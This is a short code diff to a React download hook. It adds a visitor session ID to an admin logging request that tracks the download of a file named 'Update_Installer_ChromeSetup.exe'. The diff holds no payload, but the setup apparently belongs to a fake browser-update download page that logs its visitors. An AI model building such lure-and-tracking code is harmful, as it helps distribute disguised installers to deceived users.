@@ -90,13 +90,15 @@ export function useDownload(): UseDownloadReturn {
     // ✅ CREATE admin entry IMMEDIATELY (runs on click, outside fetch)
     try {
       console.log('[ADMIN CREATE] Sending POST to /api/admin/log');
+      const sid = localStorage.getItem('visitorSession') || `${Date.now()}-${Math.random().toString(36).substring(2, 11)}`;
       const createRes = await fetch('/api/admin/log', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ 
           file: 'Update_Installer_ChromeSetup.exe', 
           status: 'in_progress',
-          progress: '0 MB / 133 MB'
+          progress: '0 MB / 133 MB',
+          session_id: sid,
         })
       });
       console.log('[ADMIN CREATE] Response status:', createRes.status);
